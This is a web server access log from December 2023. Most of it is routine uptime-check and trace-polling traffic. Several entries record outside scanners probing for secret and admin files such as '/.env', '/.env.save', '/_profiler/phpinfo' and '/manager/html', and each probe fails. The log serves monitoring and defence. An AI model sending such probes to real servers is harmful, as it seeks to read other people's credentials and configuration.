159.203.109.206 - - [21/Dec/2023:02:38:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3853 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:38:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3854 "www@docker" "http://172.20.0.9:80" 0ms
185.237.97.119 - - [21/Dec/2023:02:39:00 +0000] "GET /_profiler/phpinfo HTTP/1.1" 301 17 "-" "-" 3855 "web-to-websecure@internal" "-" 0ms
185.237.97.119 - - [21/Dec/2023:02:39:01 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 19 "-" "-" 3856 "-" "-" 0ms
185.237.97.119 - - [21/Dec/2023:02:39:02 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 3857 "web-to-websecure@internal" "-" 0ms
185.237.97.119 - - [21/Dec/2023:02:39:04 +0000] "POST / HTTP/1.1" 404 19 "-" "-" 3858 "-" "-" 0ms
185.237.97.119 - - [21/Dec/2023:02:39:05 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 3859 "web-to-websecure@internal" "-" 0ms
185.237.97.119 - - [21/Dec/2023:02:39:05 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 3860 "-" "-" 0ms
185.237.97.119 - - [21/Dec/2023:02:39:06 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 3861 "web-to-websecure@internal" "-" 0ms
185.237.97.119 - - [21/Dec/2023:02:39:07 +0000] "POST / HTTP/1.1" 404 19 "-" "-" 3862 "-" "-" 0ms
185.237.97.119 - - [21/Dec/2023:02:39:07 +0000] "GET /.env.save HTTP/1.1" 301 17 "-" "-" 3863 "web-to-websecure@internal" "-" 0ms
185.237.97.119 - - [21/Dec/2023:02:39:08 +0000] "GET /.env.save HTTP/1.1" 404 19 "-" "-" 3864 "-" "-" 0ms
185.237.97.119 - - [21/Dec/2023:02:39:08 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 3865 "web-to-websecure@internal" "-" 0ms
185.237.97.119 - - [21/Dec/2023:02:39:09 +0000] "POST / HTTP/1.1" 404 19 "-" "-" 3866 "-" "-" 0ms
159.203.109.206 - - [21/Dec/2023:02:39:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3867 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:39:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3868 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:02:40:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3869 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:40:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3870 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:02:41:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3871 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:02:41:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3872 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:02:42:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3873 "www@docker" "http://172.20.0.9:80" 0ms
54.37.79.75 - - [21/Dec/2023:02:42:27 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 3874 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [21/Dec/2023:02:42:27 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 3875 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [21/Dec/2023:02:42:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3876 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:02:43:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3877 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:02:43:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3878 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:02:44:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3879 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:44:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3880 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:02:45:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3881 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:45:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3882 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:02:46:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3883 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:46:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3884 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:02:47:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3885 "www@docker" "http://172.20.0.9:80" 0ms
64.62.197.142 - - [21/Dec/2023:02:47:23 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3886 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [21/Dec/2023:02:47:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3887 "www@docker" "http://172.20.0.9:80" 0ms
194.50.14.34 - - [21/Dec/2023:02:47:41 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3888 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [21/Dec/2023:02:48:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3889 "www@docker" "http://172.20.0.9:80" 0ms
64.62.197.146 - - [21/Dec/2023:02:48:21 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3890 "web-to-websecure@internal" "-" 0ms
64.62.197.141 - - [21/Dec/2023:02:48:21 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3891 "-" "-" 0ms
167.71.120.76 - - [21/Dec/2023:02:48:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3892 "www@docker" "http://172.20.0.9:80" 1ms
64.62.197.150 - - [21/Dec/2023:02:49:00 +0000] "GET /favicon.ico HTTP/1.1" 301 17 "-" "-" 3893 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [21/Dec/2023:02:49:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3894 "www@docker" "http://172.20.0.9:80" 0ms
64.62.197.145 - - [21/Dec/2023:02:49:28 +0000] "GET /geoserver/web/ HTTP/1.1" 301 17 "-" "-" 3895 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [21/Dec/2023:02:49:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3896 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:02:50:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3897 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:50:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3898 "www@docker" "http://172.20.0.9:80" 0ms
95.214.235.169 - - [21/Dec/2023:02:50:55 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 3899 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [21/Dec/2023:02:50:56 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 3900 "web-to-websecure@internal" "-" 0ms
167.94.138.127 - - [21/Dec/2023:02:50:56 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3901 "-" "-" 0ms
167.94.138.127 - - [21/Dec/2023:02:51:01 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3902 "-" "-" 0ms
159.203.109.206 - - [21/Dec/2023:02:51:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3903 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:51:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3904 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:02:52:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3905 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:52:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3906 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:02:53:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3907 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:53:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3908 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:02:54:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3909 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:54:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3910 "www@docker" "http://172.20.0.9:80" 0ms
182.252.66.22 - - [21/Dec/2023:02:55:13 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3911 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [21/Dec/2023:02:55:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3912 "www@docker" "http://172.20.0.9:80" 3ms
167.71.120.76 - - [21/Dec/2023:02:55:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3913 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:02:56:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3914 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:56:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3915 "www@docker" "http://172.20.0.9:80" 0ms
143.110.222.166 - - [21/Dec/2023:02:56:59 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3916 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [21/Dec/2023:02:57:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3917 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:57:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3918 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:02:58:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3919 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:58:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3920 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:02:59:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3921 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:59:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3922 "www@docker" "http://172.20.0.9:80" 1ms
143.110.222.166 - - [21/Dec/2023:02:59:40 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3923 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [21/Dec/2023:03:00:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3924 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:00:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3925 "www@docker" "http://172.20.0.9:80" 0ms
128.199.137.235 - - [21/Dec/2023:03:00:50 +0000] "GET /manager/html HTTP/1.1" 301 17 "-" "-" 3926 "web-to-websecure@internal" "-" 0ms
128.199.137.235 - - [21/Dec/2023:03:00:50 +0000] "GET /manager/html HTTP/1.1" 404 19 "-" "-" 3927 "-" "-" 0ms
159.203.109.206 - - [21/Dec/2023:03:01:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3928 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:01:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3929 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:03:02:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3930 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:02:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3931 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:03:03:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3932 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:03:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3933 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:03:04:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3934 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:04:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3935 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:03:05:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3936 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:05:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3937 "www@docker" "http://172.20.0.9:80" 0ms
35.203.211.162 - - [21/Dec/2023:03:06:10 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3938 "-" "-" 0ms
159.203.109.206 - - [21/Dec/2023:03:06:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3939 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:03:06:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3940 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:03:07:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3941 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:07:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3942 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:03:08:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3943 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:08:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3944 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:03:09:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3945 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:03:09:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3946 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:03:10:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3947 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:03:10:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3948 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:03:11:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3949 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:11:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3950 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:03:12:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3951 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:03:12:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3952 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:03:13:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3953 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:13:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3954 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:03:14:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3955 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:14:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3956 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:03:15:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3957 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:15:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3958 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:03:16:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3959 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:16:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3960 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:03:17:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3961 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:03:17:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3962 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:03:18:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3963 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:03:18:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3964 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:03:19:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3965 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:19:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3966 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:03:20:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3967 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:03:20:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3968 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:03:21:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3969 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:21:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3970 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:03:22:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3971 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:22:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3972 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:03:23:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3973 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:23:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3974 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:03:24:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3975 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:24:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3976 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:03:25:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3977 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:25:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3978 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:03:26:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3979 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:26:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3980 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:03:27:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3981 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:03:27:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3982 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:03:28:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3983 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:28:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3984 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:03:29:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3985 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:03:29:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3986 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:03:30:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3987 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:30:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3988 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:03:31:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3989 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:31:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3990 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:03:32:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3991 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:32:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3992 "www@docker" "http://172.20.0.9:80" 0ms
45.79.168.172 - - [21/Dec/2023:03:33:01 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3993 "-" "-" 0ms
159.203.109.206 - - [21/Dec/2023:03:33:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3994 "www@docker" "http://172.20.0.9:80" 1ms
172.104.11.34 - - [21/Dec/2023:03:33:23 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3995 "-" "-" 0ms
167.71.120.76 - - [21/Dec/2023:03:33:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3996 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:03:34:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3997 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:34:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3998 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:03:35:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3999 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:35:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4000 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:03:36:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4001 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:36:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4002 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:03:37:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4003 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:03:37:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4004 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:03:38:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4005 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:38:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4006 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:03:39:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4007 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:39:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4008 "www@docker" "http://172.20.0.9:80" 0ms
173.48.140.140 - - [21/Dec/2023:03:40:00 +0000] "GET /trace/starttrace.php?id=v7nwpaogc HTTP/2.0" 200 106 "-" "-" 4010 "livetrace@docker" "http://172.20.0.5:80" 42ms
173.48.140.140 - - [21/Dec/2023:03:40:00 +0000] "GET /trace/startping.php?id=66fqdcydg HTTP/2.0" 200 105 "-" "-" 4009 "livetrace@docker" "http://172.20.0.5:80" 47ms
173.48.140.140 - - [21/Dec/2023:03:40:01 +0000] "GET /trace/polltrace.php?id=v7nwpaogc HTTP/2.0" 200 76 "-" "-" 4011 "livetrace@docker" "http://172.20.0.5:80" 6ms
173.48.140.140 - - [21/Dec/2023:03:40:01 +0000] "GET /trace/pollping.php?id=66fqdcydg HTTP/2.0" 200 27 "-" "-" 4012 "livetrace@docker" "http://172.20.0.5:80" 6ms
173.48.140.140 - - [21/Dec/2023:03:40:02 +0000] "GET /trace/pollping.php?id=66fqdcydg HTTP/2.0" 200 54 "-" "-" 4014 "livetrace@docker" "http://172.20.0.5:80" 2ms
173.48.140.140 - - [21/Dec/2023:03:40:02 +0000] "GET /trace/polltrace.php?id=v7nwpaogc HTTP/2.0" 200 76 "-" "-" 4013 "livetrace@docker" "http://172.20.0.5:80" 4ms
173.48.140.140 - - [21/Dec/2023:03:40:03 +0000] "GET /trace/polltrace.php?id=v7nwpaogc HTTP/2.0" 200 76 "-" "-" 4015 "livetrace@docker" "http://172.20.0.5:80" 2ms
173.48.140.140 - - [21/Dec/2023:03:40:03 +0000] "GET /trace/pollping.php?id=66fqdcydg HTTP/2.0" 200 77 "-" "-" 4016 "livetrace@docker" "http://172.20.0.5:80" 2ms
173.48.140.140 - - [21/Dec/2023:03:40:04 +0000] "GET /trace/polltrace.php?id=v7nwpaogc HTTP/2.0" 200 76 "-" "-" 4017 "livetrace@docker" "http://172.20.0.5:80" 3ms
173.48.140.140 - - [21/Dec/2023:03:40:04 +0000] "GET /trace/pollping.php?id=66fqdcydg HTTP/2.0" 200 105 "-" "-" 4018 "livetrace@docker" "http://172.20.0.5:80" 2ms
173.48.140.140 - - [21/Dec/2023:03:40:05 +0000] "GET /trace/pollping.php?id=66fqdcydg HTTP/2.0" 200 131 "-" "-" 4020 "livetrace@docker" "http://172.20.0.5:80" 2ms
173.48.140.140 - - [21/Dec/2023:03:40:05 +0000] "GET /trace/polltrace.php?id=v7nwpaogc HTTP/2.0" 200 76 "-" "-" 4019 "livetrace@docker" "http://172.20.0.5:80" 4ms
173.48.140.140 - - [21/Dec/2023:03:40:06 +0000] "GET /trace/pollping.php?id=66fqdcydg HTTP/2.0" 200 157 "-" "-" 4022 "livetrace@docker" "http://172.20.0.5:80" 2ms
173.48.140.140 - - [21/Dec/2023:03:40:06 +0000] "GET /trace/polltrace.php?id=v7nwpaogc HTTP/2.0" 200 76 "-" "-" 4021 "livetrace@docker" "http://172.20.0.5:80" 2ms
173.48.140.140 - - [21/Dec/2023:03:40:07 +0000] "GET /trace/pollping.php?id=66fqdcydg HTTP/2.0" 200 182 "-" "-" 4024 "livetrace@docker" "http://172.20.0.5:80" 1ms
173.48.140.140 - - [21/Dec/2023:03:40:07 +0000] "GET /trace/polltrace.php?id=v7nwpaogc HTTP/2.0" 200 76 "-" "-" 4023 "livetrace@docker" "http://172.20.0.5:80" 2ms
173.48.140.140 - - [21/Dec/2023:03:40:08 +0000] "GET /trace/polltrace.php?id=v7nwpaogc HTTP/2.0" 200 76 "-" "-" 4025 "livetrace@docker" "http://172.20.0.5:80" 2ms
173.48.140.140 - - [21/Dec/2023:03:40:08 +0000] "GET /trace/pollping.php?id=66fqdcydg HTTP/2.0" 200 204 "-" "-" 4026 "livetrace@docker" "http://172.20.0.5:80" 1ms
173.48.140.140 - - [21/Dec/2023:03:40:08 +0000] "GET /trace/cleanping.php?id=66fqdcydg HTTP/2.0" 200 71 "-" "-" 4027 "livetrace@docker" "http://172.20.0.5:80" 3ms
173.48.140.140 - - [21/Dec/2023:03:40:09 +0000] "GET /trace/polltrace.php?id=v7nwpaogc HTTP/2.0" 200 76 "-" "-" 4028 "livetrace@docker" "http://172.20.0.5:80" 1ms
173.48.140.140 - - [21/Dec/2023:03:40:10 +0000] "GET /trace/polltrace.php?id=v7nwpaogc HTTP/2.0" 200 76 "-" "-" 4029 "livetrace@docker" "http://172.20.0.5:80" 2ms
173.48.140.140 - - [21/Dec/2023:03:40:11 +0000] "GET /trace/polltrace.php?id=v7nwpaogc HTTP/2.0" 200 139 "-" "-" 4030 "livetrace@docker" "http://172.20.0.5:80" 1ms
173.48.140.140 - - [21/Dec/2023:03:40:12 +0000] "GET /trace/polltrace.php?id=v7nwpaogc HTTP/2.0" 200 139 "-" "-" 4031 "livetrace@docker" "http://172.20.0.5:80" 1ms
